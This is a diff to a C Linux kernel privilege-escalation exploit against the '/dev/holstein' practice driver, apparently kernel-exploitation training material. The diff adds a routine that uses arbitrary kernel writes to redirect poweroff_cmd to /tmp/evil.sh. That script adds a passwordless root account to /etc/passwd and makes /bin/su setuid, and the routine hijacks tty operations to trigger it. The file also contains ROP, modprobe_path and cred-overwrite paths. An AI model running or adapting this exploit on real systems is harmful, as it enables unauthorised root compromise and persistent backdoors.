@@ -9,21 +9,22 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#ifdef DEBUG
-#define debug(msg, ...) fprintf(stderr, "[D] " msg "\n", ##__VA_ARGS__);
-#else
-#define debug(msg, ...)
-#endif /* ifdef DEBUG */
+typedef unsigned long long u64;
+typedef unsigned int u32;
+typedef unsigned char u8;
 
 #define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__);
 #define progress(msg, ...) printf("[+] " msg "\r", ##__VA_ARGS__);
 #define fatal(msg, ...)                                                        \
     {                                                                          \
-        fprintf(stderr, "[!] " msg "\n", ##__VA_ARGS__);                       \
+        printf("[!] " msg "\n", ##__VA_ARGS__);                                \
         exit(EXIT_FAILURE);                                                    \
     }
+#define rebase(addr) (addr - RAW_KBASE + kbase)
 
 #define DEVICE_NAME "/dev/holstein"
+#define IOCTL_DEBUG 0x10
+#define IOCTL_SET_MAX_BUFFER 0x20
 #define RAW_KBASE 0xffffffff81000000
 
 #define prepare_kernel_cred (kbase + 0x74650)
@@ -37,12 +38,10 @@
 #define mov_rax_prdx (0xffffffff813a5f29 - RAW_KBASE + kbase)
 
 #define modprobe_path (0xffffffff81e38180 - RAW_KBASE + kbase)
+#define poweroff_cmd rebase(0xffffffff81e379c0)
+#define poweroff_work_func rebase(0xffffffff81075380)
 
 #define ofs_tty_ops 0xc38880
-
-typedef unsigned long long u64;
-typedef unsigned int u32;
-typedef unsigned char u8;
 
 int global_fd;
 int aaw_cached_fd = -1;
@@ -66,7 +65,7 @@ void _write(void *buf, size_t sz) {
     if (nb < 0) {
         fatal("write failure");
     }
-    debug("Wrote 0x%zx bytes", nb);
+    /* info("Wrote 0x%zx bytes", nb); */
 }
 
 void _read(void *buf, size_t sz) {
@@ -74,10 +73,10 @@ void _read(void *buf, size_t sz) {
     if (nb < 0) {
         fatal("read failure");
     }
-    debug("Read 0x%zx bytes", nb);
+    /* info("Read 0x%zx bytes", nb); */
 }
 
-void _ioctl(u32 cmd, u64 arg) {
+void _ioctl(u32 cmd, size_t arg) {
     ioctl(global_fd, cmd, arg);
 }
 
@@ -86,7 +85,7 @@ void open_dev(void) {
     if (global_fd < 0) {
         fatal("Failed to open device: %s", DEVICE_NAME);
     }
-    debug("Device opened");
+    /* info("Device opened"); */
 }
 
 void aaw32(u64 addr, u32 val) {
@@ -169,9 +168,12 @@ void rop_privesc() {
 
     _write(buf, 0x420);
     for (size_t i = 0; i < 100; i++) {
+        /* printf("[*] spraying ioctl: %03lu\r", i); */
         ioctl(spray[i], 0xdeadbeef,
               g_buf - 0x10); // 0x10 to accomodate for `pop r13; pop rbp;`
     }
+    /* puts(""); */
+    /* info("Done spraying"); */
 }
 
 void safe_exit(void) {
@@ -180,7 +182,7 @@ void safe_exit(void) {
             ".att_syntax noprefix;");
     if (global_cstate == create_cred_struct_state) {
         cred_struct = tmp_buf;
-        debug("cred_struct @ 0x%016llx", cred_struct);
+        /* info("cred_struct @ 0x%zx", cred_struct); */
         global_cstate = spawn_shell_state;
         rop_privesc();
         return;
@@ -196,7 +198,7 @@ void save_user_state(void) {
             "pushf;"
             "pop user_rflags;"
             ".att_syntax;");
-    debug("User states are saved");
+    info("User states are saved");
 }
 
 void modprobe_path_privesc() {
@@ -224,6 +226,30 @@ void modprobe_path_privesc() {
     }
     system(trigger);
     return;
+}
+
+void overwrite_poweroff_cmd_privesc() {
+    char cmd[] = "/tmp/evil.sh";
+    for (size_t i = 0; i < sizeof(cmd); i += 4)
+        aaw32(poweroff_cmd + i, *(u32 *)&cmd[i]);
+
+    int fd = open(cmd, O_RDWR | O_CREAT);
+    dprintf(fd, "%s",
+            "#!/bin/sh\n"
+            "echo 'pwned::0:0::/:/bin/sh' >> /etc/passwd\n"
+            "chown root:root /bin/su\n"
+            "chmod +s /bin/su\n");
+    close(fd);
+    if (chmod(cmd, 0777)) {
+        fatal("chmod %s", cmd);
+    }
+    *(u64 *)&buf[0x418] = g_buf;
+    u64 *ptr = (u64 *)&buf;
+    ptr[0xc] = poweroff_work_func;
+    _write(buf, 0x420);
+    for (size_t i = 0; i < 100; i++) {
+        ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
+    }
 }
 
 void overwrite_cred_struct_privesc() {
@@ -309,7 +335,8 @@ int main(void) {
 
     /* rop_privesc(); */
     /* modprobe_path_privesc(); */
-    overwrite_cred_struct_privesc();
+    /* overwrite_cred_struct_privesc(); */
+    overwrite_poweroff_cmd_privesc();
 
     close(global_fd);
     return 0;
